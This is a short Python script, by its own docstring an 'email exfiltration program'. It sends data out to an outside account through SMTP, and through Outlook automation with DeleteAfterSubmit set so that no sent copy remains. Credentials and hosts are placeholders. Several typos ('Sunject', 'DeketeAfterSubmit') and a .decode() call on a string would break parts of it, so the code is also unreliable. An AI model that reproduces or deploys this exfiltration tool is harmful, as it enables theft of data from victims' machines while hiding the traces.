"""
Description: Email exfiltration program written in python.
Author: Aleksa Zatezalo
Date: June 2, 2023.
"""

import smtplib
import time
import win32com.client

smtp_server = 'smtp.example.com'
smtp_port = 587
smpt_acct = 'time@example'
smtp_passwd = 'seKret'
tgt_accts = ['tim@elsewhere.com']

def plain_email(subject, contents):
    message = f'Sunject: {subject}\nFrom {smpt_acct}\n'
    message += f'To: {tgt_accts}\n\n{contents.decode()}'
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smpt_acct, smtp_passwd)

    #server.ser_debuglevel(1)
    server.sendmail(smpt_acct, tgt_accts, message)
    time.sleep(1)
    server.quit()

def outlook(subject, contents):
    outlook = win32com.client.Dispatch("Outlook.Application")
    message = outlook.CreateItem(0)
    message.DeketeAfterSubmit = True
    message.Subject = subject
    message.body = contents.decode()
    message.To  = tgt_accts[0]
    message.Send()

if __name__ == '__main__':
    plain_email('test2 message', 'attack at dawn')
    